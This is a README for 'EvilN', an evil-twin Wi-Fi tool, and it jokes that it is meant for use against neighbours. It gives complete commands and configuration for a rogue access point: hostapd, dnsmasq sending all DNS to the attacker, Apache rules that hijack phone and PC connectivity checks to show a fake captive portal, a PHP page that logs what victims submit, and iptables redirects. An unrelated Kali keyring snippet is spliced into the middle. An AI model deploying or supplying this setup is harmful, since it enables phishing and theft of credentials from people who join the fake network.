# EvilN -> Evil-Neighbor

if you love your neighbors, this tool is for you :)

Just kiding (not really... )

Any use of this tool is at your own risk, this tool should be used in a lab environment  (not really... )

## If you like things done authomatically, Use:
```python
python3 EvilN.py --iface wlan0 --ssid "MyLan" --channel 1 --network 10.0.0.0/24
```
 1) Install the new keyring (official one-liner)
sudo wget https://archive.kali.org/archive-keyring.gpg -O /usr/share/keyrings/kali-archive-keyring.gpg

 2) (Optional) Verify checksum matches the official value
sha1sum /usr/share/keyrings/kali-archive-keyring.gpg
expected: 603374c107a90a69d983dbcb4d31e0d6eedfc325

 3) Update
sudo apt update


## If you like things dome manually, Use:

### 1) Installation all pachages:
```bash
sudo apt update
sudo apt install -y apache2 php libapache2-mod-php
sudo apt install -y hostapd dnsmasq lighttpd php
```

### 2) Setting up wlan0 Interface:
```bash
sudo ip link set wlan0 down
sudo ip addr flush dev wlan0
sudo ip addr add 192.168.50.1/24 dev wlan0
sudo ip link set wlan0 up
```

### 3) configure dnsmasq.conf file:
```bash
interface=wlan0
bind-interfaces
no-resolv
log-queries

dhcp-range=192.168.50.10,192.168.50.100,12h
dhcp-option=3,192.168.50.1
dhcp-option=6,192.168.50.1

address=/#/192.168.50.1

address=/captive.apple.com/192.168.50.1
address=/www.msftconnecttest.com/192.168.50.1
address=/connectivitycheck.gstatic.com/192.168.50.1
```

### 4) configure hostapd.conf file:
```bash
interface=wlan0
driver=nl80211
ssid=TestNetworkName 
hw_mode=g
channel=6
auth_algs=1
wmm_enabled=0
```

### 5) configure a2enmod:
```bash
sudo systemctl start apache2
sudo a2enmod rewrite
sudo a2enmod headers
sudo systemctl restart apache2
```

### 5) Create captive Foles:
```bash
sudo mkdir -p /var/www/captive
```

### 6) Create Web Captive Portal:
```bash
sudo mv index.html /var/www/captive/
sudo mv save.php /var/www/captive/
```

### 7) Create log file:
```bash
sudo touch /var/log/ca.log
```

### 8) Permission for file:
```bash
sudo chown www-data:www-data /var/log/ca.log
sudo chmod 640 /var/log/ca.log
```

### 9) Create Vhost:
```bash
nano /etc/apache2/sites-available/captive.conf
```

```bash
<VirtualHost *:80>
    ServerName captive.portal
    ServerAlias *
    DocumentRoot /var/www/captive


    <Directory /var/www/captive>
        AllowOverride All
        Require all granted
    </Directory>

 
    # iOS/macOS
    Alias /hotspot-detect.html /var/www/captive/index.html
    # Android
    Alias /generate_204 /var/www/captive/index.html
    # Windows
    Alias /connecttest.txt /var/www/captive/index.html

   
    RewriteEngine On
    RewriteCond %{REQUEST_URI} !^/save\.php$
    RewriteRule ^.*$ /index.html [L]

    Header always set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
    Header always set Pragma "no-cache"
    Header always set Expires "0"
</VirtualHost>
```

### 10) Start a2ensite:
```bash
sudo a2ensite captive.conf
sudo a2dissite 000-default.conf
sudo systemctl reload apache2
```


### 11) Create IpTables:
```bash
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-ports 80
sudo iptables -t nat -A PREROUTING -i wlan0 -p udp --dport 53 -j REDIRECT --to-ports 53
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 53 -j REDIRECT --to-ports 53
```

### 12) start:
```bash
sudo dnsmasq -C dnsmasq.conf
sudo hostapd hostapd.conf
```

```bash
sudo pkill dnsmasq
sudo dnsmasq -C /full/path/to/dnsmasq.conf
```
